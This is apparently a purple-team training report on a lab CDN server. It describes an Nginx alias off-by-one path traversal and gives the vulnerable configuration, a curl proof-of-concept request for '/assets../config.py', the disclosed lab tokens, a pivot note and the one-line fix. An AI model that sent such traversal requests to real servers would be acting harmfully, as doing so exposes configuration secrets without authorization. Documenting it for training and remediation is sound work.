# Red Team Engagement Report — EXT01-M05
**Operation VAJRA SHAKTI | RNG-EXT-01 | M5-ext-cdn-server**
**Engagement Type:** Purple Team Exercise | **Date:** 2025-11-15 | **Classification:** TRAINING

---

## Executive Summary
The BUNL CDN server runs Nginx with an alias directive missing a trailing slash on the location block, creating a classic path traversal condition. The request `/assets../config.py` causes Nginx to serve the application configuration file outside the intended web root.

---

## Finding 1: Nginx Alias Off-By-One Path Traversal (High)
**CWE:** CWE-22 — Path Traversal  
**CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**MITRE:** T1083

### Vulnerable Nginx Configuration
```nginx
# VULNERABLE — missing trailing slash on location
location /assets {
    alias /opt/bunl/cdn-server/assets/;
}
# /assets../config.py → /opt/bunl/cdn-server/assets/../config.py → /opt/bunl/cdn-server/config.py
```

### Proof of Concept
```bash
curl -s "http://203.x.x.x:80/assets../config.py"
```

**Output:**
```python
CORP_PIVOT_TOKEN = "vs-corp-7g9h2j4k6n2m"
CORP_ZONE_ENTRY = "BUNL HR System — DISHA (Corporate Zone, M1)"
CDN_AUTH_TOKEN = "cdn-a4f2e8b1c3d7f9a0"
```

### One-Line Fix
```nginx
# FIXED — trailing slash on location
location /assets/ {
    alias /opt/bunl/cdn-server/assets/;
}
```

---

## Artifacts
- `/etc/nginx/nginx.conf` — vulnerable alias directive
- `/opt/bunl/cdn-server/config.py` — disclosed by traversal
- `/var/log/bunl/cdn-server/access.log` — GET /assets../config.py returning 200

---

## Pivot
**RNG-CORP-01 M1:** `vs-corp-7g9h2j4k6n2m` → Corporate Zone BUNL HR System (DISHA)
